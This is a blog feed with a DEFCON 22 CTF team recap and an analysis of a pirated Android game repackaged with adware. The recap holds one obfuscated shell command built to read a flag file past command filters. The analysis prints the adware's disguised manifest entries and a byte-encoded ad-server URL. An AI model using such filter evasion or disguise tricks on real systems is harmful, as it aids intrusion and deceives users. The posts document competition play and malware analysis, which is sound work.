<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[From Zero To X]]></title>
  <link href="http://blog.ztrix.me/atom.xml" rel="self"/>
  <link href="http://blog.ztrix.me/"/>
  <updated>2014-08-21T23:11:17+08:00</updated>
  <id>http://blog.ztrix.me/</id>
  <author>
    <name><![CDATA[zTrix]]></name>
    <email><![CDATA[i@ztrix.me]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DEFCON 22 CTF 总结]]></title>
    <link href="http://blog.ztrix.me/blog/2014/08/20/defcon-22/"/>
    <updated>2014-08-20T15:51:16+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/08/20/defcon-22</id>
    <content type="html"><![CDATA[<p>Las Vegas 归来已经几天，时差还不经意地骚扰我，顿感身体素质实在不行。</p>

<p>今年 blue-lotus 最终拿到了第五名，还算是一个不错的成绩，于是记录一下今年的得失与教训，回味一下这两周的精彩。</p>

<!-- more -->


<p>吸取了去年航班延误的教训，今年提前了两天出发，于 8 月 5 日出发，继续坐最便宜的 UA888。去年延误给的 10% off 的 coupon 在真正购买机票的时候居然不能使用，不得不怒吐一槽。</p>

<p>巧的是在北京国际机场碰上了即将去 blackhat 演讲的教主 <a href="http://weibo.com/tombkeeper">tombkeeper</a>，近距离感受了一下 “面有萌色，心有丘壑&#8221; 的大师风范。路上我们一直期待教主给我们讲讲段子，特别是演示一下如何给出一个 <a href="http://weibo.com/1401527553/BfXaRiG4j">“小伙子好好干”</a> 眼神，可惜一直未能如愿。</p>

<p>今年的赛前准备做的还是比较充分的，比赛前两天又继续增强了通用防御的一些技术和自动攻击框架，同时去超市买了一大堆吃的和饮料（今年领队老师和马杰的签证都悲剧了，目测就要没人给我们各种订餐了，TT）。<a href="https://www.blackhat.com/">Kelwin</a> 还忙里偷闲去 <a href="https://www.blackhat.com/">blackhat</a> 逛了一圈。</p>

<p>然而比赛前还是出现了各种不顺利的事情，首先是 <a href="https://www.blackhat.com/">Kelwin</a> 的 老年 MBP 实在招架不住，镁光 SSD 直接 crash，启动不能（一查居然是多年前的镁光 SSD 固件门，这个发作时间真是巧的无奈），于是 <a href="https://www.blackhat.com/">Kelwin</a> 信用卡一掏，立刻去 apple store 买了一个新的 rmbp。（估计他想着旧的 MBP 回国换个硬盘还能继续使用，结果回国之后发现遇上机场暴力托运，MBP 的屏幕已坏。。感谢为 blue-lotus 积攒 RP，队长功不可没。。）</p>

<p>第二件不顺利的事情在于现场的网络环境配置。今年的环境和去年又有所不同，虽然仍然是一根网线进来，但是内网和外网通过 tagged vlan 来区分，然而我们并没有带支持 vlan 的网络设备。虽然临时买了一个 linksys 高端路由器号称支持 vlan，但是试用之后发现不能同时支持两个 vlan，只好放弃。</p>

<p>5 号早上 9 点赶到现场搭建网络，10 点就会开始比赛，于是只有紧张的一个小时来配置 vlan，好在我们带了几个额外的机器，于是就先取 mac mini。悲剧的事情是我们没有显示器，在我一次强制断电之后，mac mini 似乎直接挂了，不能启动，没办法只好借了一个显示器过来，发现 mac mini 在漫无休止地检查硬盘。于是前功尽弃，只好立刻换另外一个 samsung 笔记本来作为网关，又折腾了很久，等完全折腾好网络，队员可以同时正常访问内外网的时候，已经 12 点了，于是开赛一个小时的时间又手忙脚乱的就浪费掉了，和去年一样，硬件准备还是不够充分，一开赛就甚为慌乱，实在不是一个好事情，这里不得不检讨。</p>

<p>第三件不顺利的事情仍然来自于硬件准备，虽然带够了网络设备，网线，插线板，但是我方设备仍然实在太弱，网线都很短，插线板也很短，乱七八糟的散乱在地上，队员进出实在不便，好几次碰掉了电源，幸好没有碰掉网线造成悲剧。但是看其他队伍各种高大上的设备箱，还带有五颜六色灯光闪烁效果，就知道差距太大。未来如果还有机会，至少要带线足够长的网线和插线板，全部部署在桌子上，井井有条，至少给自己队员带来心理上的条理感，不至于太过慌乱。此乃一个教训。</p>

<h2>8 月 8 日，比赛第一天</h2>

<p>比赛形式与去年大同小异，甚至连规则都不发布了。仍然是 odroid 的 ARMv7 开发板，所不同的是，使用了 qemu 运行了 x86 等不同架构的 binary，甚至还有个 badge，是 MSP430 单片机，于是今年实际上是多架构平台，这增加了不小的挑战。</p>

<p>比赛开始我们就准备部署一些通用防御措施，然而做逆向的童鞋很快发现 binary 里面存在诸如读取 /dev/ctf 来做验证的保护措施，于是只能放弃了一些比较激进的防御措施，先静观其变。</p>

<p><img src="http://blog.ztrix.me/images/defcon-22/2014-08-08_11-51-51.png" alt="defcon 22 scoreboard" /></p>

<p>上午 11 点，最后的亚军 HITCON 因为做了通用防御无法通过检查，导致服务丢分，暂时排在最末，比赛季军 Dragon Sector 可能也做了类似的事情，导致倒数第二。我们由于发现的早，分数基本没扣，于是暂时排在前列。</p>

<p>今年的服务比去年感觉有所简单，当然也有可能是大家都有了 IDA Arm decompiler 的缘故，刚到下午就开始有队伍得分，分数开始发生变化。</p>

<p><img src="http://blog.ztrix.me/images/defcon-22/2014-08-08_15-34-25.png" alt="defcon 22 scoreboard" /></p>

<p>HITCON 反应迅速，很快就升到了前面。我们 replay 的速度也不错，加上修补漏洞比较快，于是侥幸排在第二。</p>

<p>第一天感觉下来，在漏洞挖掘上，还是和强队差距很大，我们基本都是在被打的时候，快速反应，快速修补，快速 replay，于是勉强撑过了第一天。第一天结束的时候，我们还没有自己的主动攻击，只有防御做的还算是有一些效果。</p>

<p><img src="http://blog.ztrix.me/images/defcon-22/2014-08-08_19-35-18.png" alt="defcon 22 scoreboard" /></p>

<p>第一天快结束的时候的分数榜。</p>

<p>结束以后，我们赶紧回住处草草吃了点饭，开始继续分析。</p>

<h2>8 月 9 日，比赛第二天</h2>

<p>一夜的分析还是有所收获的，无论如何，我们是带着主动攻击来了，并且一开赛就可以拿 10 余支队伍的 flag，于是打出了一波小高潮。可惜第二天主办方为了防止分数悬殊太大给后面的队伍带来心理压力以至于放弃，就关闭了分数榜，只留名次榜。</p>

<p>只可惜好景不长，各支队伍修补的速度也很快。到了下午，我们的攻击就基本上无法有效进行了，获取的 flag 也很零星，然后上了新服务，我们四处被打，手忙脚乱，十分狼狈。</p>

<p>经过前一天几乎通宵的分析，到了下午大家也都十分疲倦，cbmixx 直接在椅子上打了瞌睡，libmaru 直接表示太困太吵于是就先回住处了。</p>

<p>第二天的中间几个小时是最煎熬的一段时间。也是非常有可能守不住就不断掉名次的时候。</p>

<p>好在熬了几个小时大家终于稍微能振奋一点了，几个服务修补的也还算及时，虽然被打了不少时间。但是在这种慌乱情况下，我们发现的几个漏洞，都没有时间去写攻击。仅有的几个攻击脚本，也都因为太老，而基本攻击不成，而强队又开始不断的发起新的攻击，PPP 的 justify 新攻击一次性可以拿十几只队伍 flag，HITCON 的 eliza 也非常猛。我们在列强的夹击下非常艰难。</p>

<p>主办方放出了攻击视频 <a href="http://youtu.be/1UT3qXHduts">http://youtu.be/1UT3qXHduts</a> ，有人说我们打法太过保守，既不攻击别人，也不怎么被别人攻击。实际情况是这个时候我们已经四处挨打了，能补上几个漏洞已经是万幸，想要攻击出去早已无力。</p>

<p><img src="http://blog.ztrix.me/images/defcon-22/2014-08-09_19-06-26.png" alt="defcon 22 scoreboard" /></p>

<p>第一天快结束时的名次，虽然名次还在前面，但是我们心里知道与强队的差距，这是不可忽视的。</p>

<p>今年的防御部分我们确实做了很有效的措施，常见的漏洞都先使用 binary harden 的方法，对栈漏洞，直接进行改大栈帧，对 UAF，直接 patch 掉 free 操作等，于是至少可以挡住第一波的进攻。当稳定下来以后，我们再进一步做深度修补，这取得了非常好的效果。这里不得不提及一下 HITCON 思路新颖，他们的栈漏洞 binary harden 方法是直接把栈迁移到环境变量区，于是在一定程度上使得利用非常困难，甚至可以算是彻底修复了栈漏洞，这个比我们加大栈帧的方法高明了不少，确实是一流队伍出奇招啊。</p>

<p>第二天我们仍然尝试做了几个通用防御，结果要么是过不了 SLA 检查，要么就太过激进被主办方警告了，于是便全部放弃了，只留了 inotify flag 检测。</p>

<p>第二天比赛中间安恒老板范渊，还有腾讯等好几拨人过来给我们带了不少吃的，还有不少人也过来支持鼓励我们，非常感谢！没有领队老师在的时候，都靠业界前辈支持了。只不过我们比赛过程中，实在是又累又困又紧张又慌乱，抽不出空与各位朋友好好交流，并不是某位小编说的态度不可一世爱理不理，这希望能够得到大家理解。</p>

<p>另外不得不再次怒吐一槽的是，Rio 居然强制要求所有赛场队伍必须订他们指定外卖，只能付现金，并且不找零钱，强制霸王条款，让人不可理喻。好玩的是 DEFCON closing ceremony 上立刻就宣布明年就不在 Rio 办了，太贵太坑，明年要去 <a href="http://www.ballyslasvegas.com/">Bally</a></p>

<h2>8 月 10 日，比赛第三天，最后的决战</h2>

<p>比赛最后一天只有 4 个小时，但仍然激烈，程度不亚于第二天，因为会有一大波 0day 四面八方砸来。</p>

<p>经过一个晚上又是几乎一个通宵，我们修补了大部分漏洞，并且又写了几个攻击，于是第三天早上，又打出了一小波攻击，但是无济于事，强队实在过于强大，实际上我猜测分数还是在下降的。这个时候 PPP HITCON 还有 Dragon Sector 都显然比我们强很多，我们后面的 Reckless Abandon 和 Men in black hat 进攻势头也很猛，都很有可能超过我们。</p>

<p>然而第三天还是出现了一些状况，使得状况变得更加糟糕。</p>

<p>第一个比较郁闷的事情是，其中有一个服务我们花了将近 2 个小时修补完了，结果被对手放了后门，并且会自动 fork ，kill 的速度比不过 fork 的速度，于是我们的自动 kill shell 脚本没有把后门 kill 掉。后来我们才知道对于这种后门应该先发送 STOP 信号。于是就这样无辜丢了可能将近 250 分。</p>

<p>第二个也很郁闷的事情是，<a href="https://www.blackhat.com/">kelwin</a> 的 eliza 攻击脚本已经差不多写完了，然而发现远程攻击速度太慢，还是不能正常获取 flag，等于白白浪费了时间，一直到比赛结束都没有能进行自动攻击，非常可惜。</p>

<p>第三个更加郁闷的事情是，badge 服务第三天有队伍进行了 dos 攻击，我们前面分析了很久的 badge，虽然不能攻击，但是对服务比较熟，于是很快 patch 了这个 dos 攻击的漏洞。于是如果这个攻击一直进行的话，我们将会因为别人的服务 down 掉获取很多分数，结果主办方突然就宣布这个 dos 攻击是不允许的，于是 badge 上我们就几乎没有得分，或者也可能拿了其中一两轮的分数，但是由于我们自己刷 rom 还要 down 一两轮，所以最终都不知道是得分了还是丢分了。</p>

<p>badge 是主办方耗费了不少心血设计的题目，很可惜由于出现各种问题，包括中心服务器的问题等，导致 PPP 早就搞定了没有得分，一直到最后才有 Routards 拿分，但是也基本无法改变局势了，不然一定会造成排名大变。对于主办方是一个非常可惜的事情。</p>

<p>另外还有一个很好玩的事情是，许多队伍的通用防御都做了 shell 命令检测过滤，于是大家都开始写花命令来获取 flag。从最开始最简单的 <code>cat flag</code>，后来慢慢越来越复杂，最后命令变成了</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>A="fla"; B="g"; /usr/b${nyaL}in/ba${blah}se64 "$A$B"</span></code></pre></td></tr></table></div></figure>


<p>这个检测和防御我们并没有做，如果做的话还是有一定迷惑效果的，以后应该做一下。</p>

<p>由于最后一天主办方完全封榜，看不到分数和排名，大家都是在盲打盲撞，还是比较忐忑的。比赛结束之后，感觉了一下，前三名很可能是 PPP HITCON 和 Dragon Sector，结果果然正好猜中，恭喜他们，特别是 HITCON 和 Dragon Sector 都是第一年参加 DEFCON 决赛，实属不易，令人钦佩。</p>

<p><img src="http://blog.ztrix.me/images/defcon-22/final.png" alt="defcon 22 scoreboard" /></p>

<p>比赛最终结果在一周后揭晓了，我们处在第五名，与预测差别不大，还是很开心的，毕竟今年实现了突破，实现了快速修补防御，实现了主动攻击，名次上也超过了目标预期，各方面都算是稳步进步了。</p>

<h1>感谢</h1>

<p>最后要感谢安全宝鼎力赞助支持，支持这么多人参加决赛实在是不小的开销。也感谢安恒范渊(给我们买 Pizza 送饮料，帮忙解决不少后勤问题)、腾讯（有两个部门都请我们吃了饭来支持）、<a href="http://weibo.com/tombkeeper">tombkeeper</a> 的鼓励、李康教授的帮助和指导，还有各位来自于阿里等业内公司的朋友，我无法记住全部，在此只能一并道谢！</p>

<p>这里放上比赛结束合影一张，感谢 <a href="http://weibo.com/zhenglipeng">@郑立鹏</a> 友情提供。</p>

<p><img src="http://blog.ztrix.me/images/defcon-22/defcon22-blue-lotus.jpg" alt="defcon blue-lotus" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[欢乐积木盗版应用分析]]></title>
    <link href="http://blog.ztrix.me/blog/2014/07/07/joystacker-pirated-analysis/"/>
    <updated>2014-07-07T01:05:52+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/07/07/joystacker-pirated-analysis</id>
    <content type="html"><![CDATA[<p>前面一篇日志提到，我们的游戏欢乐积木刚刚在国内安卓市场上线一天，立刻就被盗版重打包做了植入，这篇日志就来分析一下，盗版应用究竟做了什么改动。</p>

<p>总共发现了至少 5 个不同的盗版打包，其中包名为 <code>com.rayxyj.stacker</code> 的盗版上线最早，下载量和用户使用都最大，因此就拿这个盗版版本开刀。</p>

<p>这家盗版在多个市场都有投放，比如 <a href="http://www.wandoujia.com/apps/com.rayxyj.stacker">http://www.wandoujia.com/apps/com.rayxyj.stacker</a> 和 <a href="http://www.anzhuoapk.com/games-15-2/62640/">http://www.anzhuoapk.com/games-15-2/62640/</a> ，并且表明了开发者来源是掌赢科技有限公司，下载次数应该已经上千，在最近的数据统计中，使用的用户占比 12.25%，因此是一个比较典型的案例。</p>

<p>这个盗版版本基于的是我的 1.4 版本重打包。后续我又发布了 1.6 版本，他们并没有跟进。</p>

<!-- more -->


<p>那么重打包发布的盗版积木究竟植入了什么东西呢？我们来一探究竟。</p>

<h2>Manifest 文件</h2>

<p>首先使用 <code>apktool</code> 来解包。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>apktool d 20140618190420_534.apk
</span></code></pre></td></tr></table></div></figure>


<p>对比盗版的 AndroidManifest.xml 和我自己项目的 Manifest 文件，可以发现，盗版主要做了三项修改：</p>

<ol>
<li>修改包名</li>
<li>增加 Android 各种权限申请</li>
<li>增加植入的 Activity 和 Service</li>
</ol>


<h3>包名变化</h3>

<p>首先包名发生了变化，由于各大市场都是用包名作为应用的唯一识别，因此必须改变包名才能重新发布不冲突。</p>

<p>原有包名</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="na">package=</span><span class="s">&quot;com.rayx.stacker&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>盗版包名</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;manifest</span> <span class="na">android:versionCode=</span><span class="s">&quot;14&quot;</span> <span class="na">android:versionName=</span><span class="s">&quot;1.4&quot;</span> <span class="na">package=</span><span class="s">&quot;com.rayxyj.stacker&quot;</span>
</span><span class='line'>  <span class="na">xmlns:android=</span><span class="s">&quot;http://schemas.android.com/apk/res/android&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>额外权限请求</h3>

<p>权限方面，在原有权限的基础上，新增加了如下权限，注意其中的 <code>WAKE_LOCK</code>, <code>RESTART_PACKAGES</code>, <code>SYSTEM_ALERT_WINDOW</code>，这些权限都是明显的与应用功能不符合的权限要求，其中 <code>RESTART_PACKAGES</code> 权限在 API Level 8 之后，都已经被 Google 所放弃。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.INTERNET&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.READ_PHONE_STATE&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.WAKE_LOCK&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.RESTART_PACKAGES&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>activity 与 service 植入</h3>

<p>以下是植入的 Activity 和 Service</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">&quot;DX_EKYML_DIA&quot;</span> <span class="na">android:value=</span><span class="s">&quot;07ac14f8dc0a4eb4a4facb4e48ea5cfa&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;service</span> <span class="na">android:name=</span><span class="s">&quot;com.android.mks.Ssreb&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;activity</span> <span class="na">android:theme=</span><span class="s">&quot;@*android:style/Theme.NoTitleBar.Fullscreen&quot;</span> <span class="na">android:name=</span><span class="s">&quot;com.android.mks.Atcab&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;receiver</span> <span class="na">android:name=</span><span class="s">&quot;com.android.mks.Bvreb&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;intent-filter&gt;</span>
</span><span class='line'>        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&quot;android.intent.action.USER_PRESENT&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/intent-filter&gt;</span>
</span><span class='line'>    <span class="nt">&lt;intent-filter&gt;</span>
</span><span class='line'>        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&quot;android.intent.action.PACKAGE_ADDED&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">&quot;package&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/intent-filter&gt;</span>
</span><span class='line'><span class="nt">&lt;/receiver&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看出，盗版游戏植入了一个名字极具隐蔽性的 package <code>com.android.mks</code>，如果不仔细看还以为是 Android 自带的系统 package，同时它接受系统的 <code>USER_PRESENT</code> 和 <code>PACKAGE_ADDED</code> 消息，分别代表用户解锁屏幕事件和用户安装了新应用事件。另外，AndroidManifest 中还植入了一个 <code>meta-data</code>，后面的分析可以知道，它是一个广告平台的 App key。</p>

<h2>植入代码分析</h2>

<p>植入代码是经过混淆的，主要代码在 <code>com.android.mks</code> 包下面。</p>

<p>经过检查发现，原来积木的代码基础上，并没有进行直接的代码插入和改写，完全保持了原样，但是如果不修改原有代码的逻辑，如何让插入代码可以执行呢？注意 <code>AndroidManifest</code> 文件里面注册的 BroadcastReceiver，由于注册了两个系统消息(<code>USER_PRESENT</code> 和 <code>PACKAGE_ADDED</code>) 的监听接受，它实际上已经可以不注入任何额外代码就能运行，只需要等用户解锁屏幕即可运行，因此是非常聪明的一种做法，另外，它还注册了对用户安装新应用的事件监听，增加自己代码被唤醒的机会。</p>

<p>再考虑到盗版发布的速度，可以推测，这很有可能是已经成形的自动植入方案，直接解包，插入 <code>com.android.mks</code> 包和 AndroidManifest 相关配置，无需人工分析原有代码，编写一个自动化工具即可搞定。如果要在原有代码上进行植入，反而需要人工分析原有逻辑，找到最佳植入点，不利于快速重打包，对不同应用来说还需要进行不同的分析，很难做到“产业化”和“规模化”。</p>

<p>想到这里不禁感到一阵心寒，盗版产业虽然平时看不到，但是管中窥豹，这点小细节基本就能看出这个产业也是十分自动化和健全的，甚至可能是一套完整的自动化机制，自动寻找新上线的目标应用，自动下载，自动重打包，自动再上传，全程无人工干预，自动进行。</p>

<p>继续分析代码。一个很奇怪的现象是，几乎所有的用到字符串的地方，都是用字符数组的形式来做的，比如，在 <code>u/A.class</code> 中，发现了如下常量</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span> <span class="o">{</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">58</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">108</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">109</span><span class="o">,</span> <span class="mi">105</span><span class="o">,</span> <span class="mi">108</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">99</span><span class="o">,</span> <span class="mi">107</span><span class="o">,</span> <span class="mi">46</span><span class="o">,</span> <span class="mi">99</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">109</span><span class="o">,</span> <span class="mi">58</span><span class="o">,</span> <span class="mi">56</span><span class="o">,</span> <span class="mi">55</span><span class="o">,</span> <span class="mi">56</span><span class="o">,</span> <span class="mi">48</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">109</span><span class="o">,</span> <span class="mi">108</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">76</span><span class="o">,</span> <span class="mi">105</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">46</span><span class="o">,</span> <span class="mi">106</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">112</span> <span class="o">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>将它转化为字符串，得到 <code>http://lemilock.com:8780/push/html/pushList.jsp</code>，打开这个网站，可以看到是一家小型 Android 广告平台，这个链接是它的广告推送列表。</p>

<p>由此可以确定这个重打包主要目的是插入广告。</p>

<p>那么这个乐米广告平台到底是怎样的一个平台呢？为什么字符串要全部用这种不直观的形式来使用呢？注册一个账号试试。</p>

<p>首先看到平台简介</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="err">平台简介</span>
</span><span class='line'><span class="err">乐米平台是德信软件科技有限公司（以下简称“德信”）旗下的平台，德信是一家致力于</span><span class="n">android</span><span class="err">开发的公司。乐米平台目前主要从事</span><span class="n">android</span><span class="err">广告创新和研发。我们广告平台包含弹窗广告、插屏广告、新版推送广告模式！</span>
</span></code></pre></td></tr></table></div></figure>


<p>找到他的 SDK 下载，<a href="http://lemilock.com/lemi/developers.jsp">http://lemilock.com/lemi/developers.jsp</a> 页面，其“先进特性”让人惊呆</p>

<ul>
<li>开发者使用乐米广告后，各大平台不会检测出广告，100% 通过率保证</li>
<li>用户使用过程中不会被安全软件拦截，不会被各种去广告软件检测</li>
<li>最重要的，它甚至可以自定义包名，Activity 名，Service 名，甚至 appid 的 key 都可以自由指定</li>
</ul>


<p>这里放个截图</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/lemi.png" alt="乐米" /></p>

<p>果然是一家为了流氓广告应用考虑十分周到的广告平台，而且，这些先进特性也不是随便吹的，我们可以去市场上看看</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/wandoujia.jpg" alt="豌豆荚" /></p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/yiyonghui.jpg" alt="易用汇" /></p>

<p>两家市场都被轻易骗过，乐米广告果然是盗版之友。</p>

<p>现在差不多明白了，这些字符串写成这种形式，包名任意定制等特性，就是为了绕过各大安卓市场的广告检查，最终显示给用户一个“绿色、无广告、无病毒”的好应用形象。</p>

<p>于是，下载一个乐米 SDK 并和植入的代码进行对比，经过分析发现，基本就是乐米的 SDK，并没有发现其他代码。简单分析可以知道，乐米 SDK 所做的事情就是，在被 <code>USER_PRESENT</code> 或 <code>PACKAGE_ADDED</code> 系统消息唤醒之后，它会尝试开启自己的后台 service，后台 service 会去请求广告，下载广告数据，然后在一定的时间条件下显示广告，诱惑用户点击，自动下载应用，显示系统消息，检测广告应用的安装情况等。</p>

<p>那么，除了广告之外，还有没有其他恶意行为呢？比如偷偷上传通讯录什么的？经过分析发现，没有找到相关恶意代码，没有申请相关权限，也没有看到相关流量，基本排除存在这些恶意行为的可能。</p>

<h2>真机测试</h2>

<p>根据前面的分析，植入广告后得盗版应用植入了广告，并且初步分析并没有恶意代码行为，因此我勇敢的用了自己的手机来做小白鼠实验，进行真机测试。</p>

<p>首先卸载我的正版应用，装上盗版，简单的进入界面，然后关闭屏幕，然后点亮屏幕，解锁，反复多次之后，终于看到了广告加载了出来。</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/test_pop.png" alt="pop" /></p>

<p>这个广告弹窗十分高级，可以在屏幕内任意拖动。点击下载玩玩，没有弹出提示，真的立刻就下载了。点击详情介绍，会弹出它注册的 Activity</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/test_detail.png" alt="app detail" /></p>

<p>然后下载了之后就提示安装</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/test_install.png" alt="app install" /></p>

<p>流氓软件下载来的肯定也不是好应用，这个打飞机游戏居然还要发短信、查看短信、编辑短信，莫非是一个吸费应用？看到这不敢装了，直接取消安装。</p>

<p>过了一会，发现系统通知栏有动静，打开一看，广告平台又弹出了新应用推荐通知</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/test_noti.png" alt="android notification" /></p>

<p>校花校草，帅哥美女！关键词吸引我点击了一下，</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/test_detail2.png" alt="app detail2" /></p>

<p>果然又是一个吸引宅男屌丝用户的应用，点击下载，这个权限要求更可怕，要求收短信、录音、拍照、读写通话记录、还有修改联系人！</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/test_install2.png" alt="app install" /></p>

<p>虽然图里面的那个妹子还挺清纯可爱的，但是看到这也不得不忍痛取消了，这权限简直是要管理手机的节奏啊。</p>

<p>连续点击返回，准备退出广告，结果发现，应用程序都退出了，广告弹窗居然仍然存在，看来弹窗并不是依附在程序界面中的。</p>

<p><img src="http://blog.ztrix.me/images/joystacker-pirated/still_exist.png" alt="still exist" /></p>

<p>那如何才能退出这个广告弹窗呢？测试了半天，发现只有点击广告详情介绍，进入详情页面，然后再点击两次返回键，才能退出广告。流氓广告的特性展露了出来。</p>

<h2>植入的其他资源文件分析</h2>

<p>重打包的 apk 文件中，在 assets 目录下植入了一个 <code>res_pro.png</code> 的文件，虽然带着 .png 的扩展名，但是实质上是一个 zip 文件。解压之后，得到了几个图片文件，看起来应该也是广告平台的资源文件。</p>

<h1>总结</h1>

<p>经过以上的初步分析，现在基本弄清楚了盗版重打包的思路。可怕的地方不在于盗版应用有能力做重打包和代码植入，而在于他们的自动化和产业化，快速盗版，快速上线，一个应用也许赚不到多少钱，但是盗版形成规模之后，收入还是很可观的。</p>

